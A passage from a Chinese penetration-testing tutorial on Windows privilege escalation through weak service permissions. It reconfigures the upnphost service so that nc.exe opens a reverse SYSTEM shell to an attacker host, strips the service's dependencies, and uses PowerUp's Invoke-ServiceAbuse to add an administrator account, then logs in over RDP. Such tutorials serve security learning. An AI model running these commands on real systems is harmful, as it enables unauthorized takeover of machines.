<p>回到监听器，可以看到已经收到了 SYSTEM shell！不过，我们会发现，当服务“失败”时，这个 shell 很快就会掉线。而为了避免这个问题，我们需要在攻击者的机器上启动第二个 netcat 监听器，然后使用类似的命令向第二个监听器快速推送第二个 shell。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346437-1358805757-411ea60a668a4b05bf95815ec76f41f2.png" width="669" height="163" class="img_ev3q"></p>
<p>这次，在第二个监听器中，我们获得了稳定的 SYSTEM shell！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346587-747108194-2bc30bfdee95f47487c045692a5f861d.png" width="497" height="177" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="5注意事项"><strong><div id="id5">5、注意事项</div></strong><a href="#5注意事项" class="hash-link" aria-label="5注意事项的直接链接" title="5注意事项的直接链接">​</a></h2>
<p>通常，我们可以像上面那样用标准用户去修改服务，但有时，可能还需要一些额外的修改才能使漏洞发挥作用。</p>
<p>例如，假设我们有能力修改 upnphost 服务，但当我们查询该服务时，却发现它有依赖关系，而这种关系又会导致我们的服务程序不能被触发运行。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346757-1417304053-de6c14bbc1cb709b26d8120488dd52c5.png" width="797" height="260" class="img_ev3q"></p>
<p>这就意味着我们还需要对其它一些配置进行更改。</p>
<p>首先，还是像以前那样更改 binpath ：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc config upnphost binPath= &quot;C:\temp\nc.exe 172.16.1.30 443 -e C:\windows\system32\cmd.exe&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346632-2038779097-d21e634d06d11b9cecef8dd17785d347.png" width="813" height="326" class="img_ev3q"></p>
<p>然后，我们需要删除依赖关系，并更改服务启动身份为 LocalSystem：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sc config upnphost depend= &quot;&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346743-1444483762-17b898ca2d3dcaeecf4ec88d48c3379b.png" width="735" height="370" class="img_ev3q"></p>
<p>最后，就像以前一样，启动监听器，重启服务，获得 SYSTEM shell！</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="6滥用-powerupps1-功能"><strong><div id="id6">6、滥用 PowerUp.ps1 功能</div></strong><a href="#6滥用-powerupps1-功能" class="hash-link" aria-label="6滥用-powerupps1-功能的直接链接" title="6滥用-powerupps1-功能的直接链接">​</a></h2>
<p>在 <a href="#id3.2">3.2小节</a>的时候，当使用 PowerUp.ps1 枚举服务时，它显示了以下 AbuseFunction 提示，现在我们可以使用它来利用这个漏洞。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346593-1294614492-966d9da156e24788c61bb8822e3a4ec9.png" width="509" height="136" class="img_ev3q"></p>
<p>使用此 AbuseFunction 将创建一个恶意程序，该程序会创建一个新用户，并将该用户归入管理员组。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Invoke-ServiceAbuse -ServiceName &#x27;Juggernaut&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346587-570226796-3ec2bcd26717deae4520f99b21a491b5.png" width="727" height="122" class="img_ev3q"></p>
<p>当滥用命令执行之后，当我们检查服务时，发现它没有更改 binpath？</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184350217-758600661-1ac6b7ad0f8ed0f577c9b1c60309011b.png" width="587" height="240" class="img_ev3q"></p>
<p>但如果我们使用 net user 命令和 net localgroup administrators 命令时，会发现该用户已经创建并添加到了本地管理员组！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184346594-1072598185-ff3ad49a2d5446d06bdb4cd5f14f4194.png" width="742" height="361" class="img_ev3q"></p>
<p>原来，PowerUp 在修改完 binpath 并重新启动服务创建本地管理员用户之后，又将 binpath 自动恢复到了原来的默认路径！</p>
<p>这时候，如果受害者机器上的 RDP 服务是打开状态，那我们就可以使用 xfreerdp 轻松 RDP 登录，然后 “以管理员身份运行” cmd.exe，进入具有完全权限的高完整性 shell。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo xfreerdp /u:john /p:&#x27;Password123!&#x27; /v:172.16.1.50 +clipboard</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250318184347219-2061112517-72aff468d6491e3802e55c05cf432950.png" width="1024" height="830" class="img_ev3q"></p>
<p>但是，如果目标没有打开 RDP 服务。此时，我们就需要通过 <a href="https://www.cnblogs.com/kqdssheng/p/18751119" target="_blank" rel="noopener noreferrer">Runas</a> 和 <a href="https://www.cnblogs.com/kqdssheng/p/18745249" target="_blank" rel="noopener noreferrer">UAC-bypass</a> 技术来获取管理员高完整性 shell。</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Windows 提权-服务_弱文件_目录权限</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Windows 提权-服务_弱注册表权限</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#导航" class="table-of-contents__link toc-highlight">导航</a></li><li><a href="#0前言" class="table-of-contents__link toc-highlight"><strong><div>0、前言</div></strong></a></li><li><a href="#1搜寻非标准服务" class="table-of-contents__link toc-highlight"><strong><div>1、搜寻非标准服务</div></strong></a></li><li><a href="#2搜寻服务的弱权限" class="table-of-contents__link toc-highlight"><strong><div>2、搜寻服务的弱权限</div></strong></a></li><li><a href="#3工具搜寻弱服务" class="table-of-contents__link toc-highlight"><strong><div>3、工具搜寻弱服务</div></strong></a></li><li><a href="#4利用服务的弱权限" class="table-of-contents__link toc-highlight"><strong><div>4、利用服务的弱权限</div></strong></a></li><li><a href="#5注意事项" class="table-of-contents__link toc-highlight"><strong><div>5、注意事项</div></strong></a></li><li><a href="#6滥用-powerupps1-功能" class="table-of-contents__link toc-highlight"><strong><div>6、滥用 PowerUp.ps1 功能</div></strong></a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="margin-bottom--sm"><a href="https://www.cnblogs.com/kqdssheng" rel="noopener noreferrer" class="footerLogoLink_BH7S"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--light_NVdE" width="30" height="30"><img src="/web/img/logo.svg" alt="博客园" class="footer__logo themedComponent_mlkZ themedComponent--dark_xIcU" width="30" height="30"></a></div></div></div></footer></div>
</body>
</html>